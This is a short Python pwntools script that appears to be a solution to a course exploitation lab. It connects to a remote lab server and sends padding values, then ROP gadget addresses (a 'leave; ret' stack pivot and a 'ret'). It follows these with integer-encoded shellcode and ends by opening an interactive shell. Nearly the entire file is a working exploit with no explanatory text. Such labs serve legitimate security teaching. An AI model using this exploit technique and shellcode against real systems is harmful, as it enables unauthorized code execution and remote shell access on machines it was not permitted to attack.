from pwn import *

# Payload
#payload = (PADDING + str( SHELLCODE))
#print("The final payload is: ", payload)
#print("")

# Start a local process
#p = gdb.debug("./lab2-3.bin")
#p = process("./lab2-3.bin")

# Start a remote process
p = remote("csc748.hostbin.org", 7023)

# Receive and print response
response = p.recvuntil('the list')
print(response.decode('utf-8'))

p.sendline('1111') # PADDING
p.sendline('1111')
p.sendline('2222')
p.sendline('2222')
p.sendline('3333')
p.sendline('3333')
p.sendline('4444')
p.sendline('4444')
p.sendline('5555')
p.sendline('5555')
p.sendline('6666') 
p.sendline('6666')
p.sendline('4199292') # ROP gadget => leave; ret; at memory  0x40137c
p.sendline('0')
p.sendline('4198426') # ROP gadget =>  ret;  at memory 0x40101a
p.sendline('0')
p.sendline('3091753066') # Shellcode 
p.sendline('1852400175')
p.sendline('1932472111')
p.sendline('3884533840')
p.sendline('23687784')
p.sendline('607420673')
p.sendline('16843009')
p.sendline('1784084017')
p.sendline('21519880')
p.sendline('2303219430')
p.sendline('1792160230')
p.sendline('84891707')
p.sendline(str(-1))

# Switch to interactive
p.interactive()
